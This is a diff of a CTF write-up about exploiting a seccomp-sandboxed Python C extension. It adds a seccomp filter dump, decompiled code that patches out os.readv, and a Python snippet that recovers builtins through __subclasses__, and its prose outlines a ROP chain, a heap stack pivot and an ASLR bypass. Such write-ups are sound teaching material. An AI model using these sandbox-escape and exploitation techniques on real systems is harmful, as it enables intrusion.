@@ -192,7 +192,152 @@ We can get a full arbitrary RW by using bytearrays. There is a member in the byt
 
 ## Gaining RCE
 
-Now that we have an arbitrary RW primitive, what can we do? Unlinke in challenges where you overwrite malloc_hook with one_gadget and a shell is obtained, we need complex control flow manipulation in this case.
+Now that we have an arbitrary RW primitive, what can we do? Unlinke in challenges where you overwrite malloc_hook with one_gadget and a shell is obtained, we need complex control flow manipulation in this case. That is because of all of the SECCOMP restrictions on the binary. I used david942j's one_gadget to analyze seccomp filters.
+
+```
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0006
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0010: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0012
+ 0011: 0x05 0x00 0x00 0x00000011  goto 0029
+ 0012: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x15 0x00 0x01 0x00000019  if (A != mremap) goto 0016
+ 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0016: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0018
+ 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0018: 0x15 0x00 0x01 0x000000ca  if (A != futex) goto 0020
+ 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0020: 0x15 0x00 0x01 0x00000083  if (A != sigaltstack) goto 0022
+ 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
+ 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0024: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0026
+ 0025: 0x05 0x00 0x00 0x00000037  goto 0081 #write syscall
+ 0026: 0x15 0x00 0x01 0x0000000d  if (A != rt_sigaction) goto 0028
+ 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0028: 0x06 0x00 0x00 0x00000000  return KILL
+ 0029: 0x05 0x00 0x00 0x00000000  goto 0030
+ 0030: 0x20 0x00 0x00 0x00000010  A = args[0]
+ 0031: 0x02 0x00 0x00 0x00000000  mem[0] = A
+ 0032: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
+ 0033: 0x02 0x00 0x00 0x00000001  mem[1] = A
+ 0034: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0038
+ 0035: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0036: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0039
+ 0037: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0038: 0x06 0x00 0x00 0x00000000  return KILL
+ 0039: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0040: 0x20 0x00 0x00 0x00000020  A = args[2]
+ 0041: 0x02 0x00 0x00 0x00000000  mem[0] = A
+ 0042: 0x20 0x00 0x00 0x00000024  A = args[2] >> 32
+ 0043: 0x02 0x00 0x00 0x00000001  mem[1] = A
+ 0044: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0048
+ 0045: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0046: 0x15 0x02 0x00 0x00000003  if (A == 0x3) goto 0049
+ 0047: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0048: 0x06 0x00 0x00 0x00000000  return KILL
+ 0049: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0050: 0x20 0x00 0x00 0x00000028  A = args[3]
+ 0051: 0x02 0x00 0x00 0x00000000  mem[0] = A
+ 0052: 0x20 0x00 0x00 0x0000002c  A = args[3] >> 32
+ 0053: 0x02 0x00 0x00 0x00000001  mem[1] = A
+ 0054: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0058
+ 0055: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0056: 0x15 0x02 0x00 0x00000022  if (A == 0x22) goto 0059
+ 0057: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0058: 0x06 0x00 0x00 0x00000000  return KILL
+ 0059: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0060: 0x20 0x00 0x00 0x00000030  A = args[4]
+ 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A
+ 0062: 0x20 0x00 0x00 0x00000034  A = args[4] >> 32
+ 0063: 0x02 0x00 0x00 0x00000001  mem[1] = A
+ 0064: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0068
+ 0065: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0066: 0x15 0x02 0x00 0xffffffff  if (A == 0xffffffff) goto 0069
+ 0067: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0068: 0x06 0x00 0x00 0x00000000  return KILL
+ 0069: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0070: 0x20 0x00 0x00 0x00000038  A = args[5]
+ 0071: 0x02 0x00 0x00 0x00000000  mem[0] = A
+ 0072: 0x20 0x00 0x00 0x0000003c  A = args[5] >> 32
+ 0073: 0x02 0x00 0x00 0x00000001  mem[1] = A
+ 0074: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0078
+ 0075: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0076: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0079
+ 0077: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0078: 0x06 0x00 0x00 0x00000000  return KILL
+ 0079: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0080: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0081: 0x05 0x00 0x00 0x00000000  goto 0082
+ 0082: 0x20 0x00 0x00 0x00000010  A = args[0] #sys_write
+ 0083: 0x02 0x00 0x00 0x00000000  mem[0] = A
+ 0084: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
+ 0085: 0x02 0x00 0x00 0x00000001  mem[1] = A
+ 0086: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0092
+ 0087: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0088: 0x15 0x00 0x02 0x00000001  if (A != 0x1) goto 0091
+ 0089: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0090: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0091: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0092: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0098
+ 0093: 0x60 0x00 0x00 0x00000000  A = mem[0]
+ 0094: 0x15 0x00 0x02 0x00000002  if (A != 0x2) goto 0097
+ 0095: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0096: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0097: 0x60 0x00 0x00 0x00000001  A = mem[1]
+ 0098: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+Also, to keep the challenge from turning into a silly, misc-style pyjail escape challenge the author added a code to patch the python binary and remove a feature from it.
+```
+PyObject *PyInit_Collection()
+{
+  PyObject * module;
+
+  if ( PyType_Ready(&module) < 0 )
+    return 0LL;
+
+  module = (PyObject *)PyModule_Create2(&module_definition, 1013);// 1013 is module_api_version
+
+  if ( module )
+  {
+    ++module.ob_refcnt;
+    PyModule_AddObject(module, "Collection", &module);
+
+    mprotect((void *)0x439000, 1uLL, 7);
+    memcpy((void*)0x43968F,&int3_seq,0x10);
+    memcpy((void*)0x43969F,&int3_seq,0x10);
+    mprotect((void *)0x439000, 1uLL, 5);
+
+    init_sandbox();
+  }
+  return module;
+}
+```
+
+Looking at the address I figured out that 0x43968F is the address of the code that handles os.readv() function. By patching this to a "\xCC" sequence (int3) the author prevented the attacker from using os.readv() to solve the challenge without memory corruption.
+
+#### side note
+We could retrieve important python builtins using the following code. I'll skip the explanations for them.
+```
+sys = modules['sys']
+os = modules['os.path'].os
+
+for x in ().__class__.__base__.__subclasses__():
+  if x.__name__ == 'bytearray':
+    bytearray = x
+    break
+```
 
 The flag is located in fd 1023 and we only have readv, mmap, and write to load the contents and show it. However I decided to use readv and write because mmap had special constraints to it via seccomp. We cannot use a one_gadget because execve is forbidden. We need a ROP to call all those functions with carefully set arguments. How to we do ROP when there is no stack overflow? We pivot the stack to the heap.
 
@@ -200,7 +345,8 @@ At first I created a ROP chain that works only on the debugger. After adjusting 
 
 My plan is to defeat ASLR using abitrary read. I used the struct link_map structure located at .got.plt+0x8, which is a structure used to map all the shared objects. Using this I decided to find the `Collection.cpython-36m-x86_64-linux-gnu.so`'s base address.
 
-** one note: All libraries are mmaped adjacent to each other but there were other shared libraries (such as libpthread) linked as well. Therefore the offset could be different in the local and remote environment since libpthread and other libraries' size would be different.
+#### side note
+All libraries are mmaped adjacent to each other but there were other shared libraries (such as libpthread) linked as well. Therefore the offset could be different in the local and remote environment since libpthread and other libraries' size would be different.
 
 ```
 struct link_map{
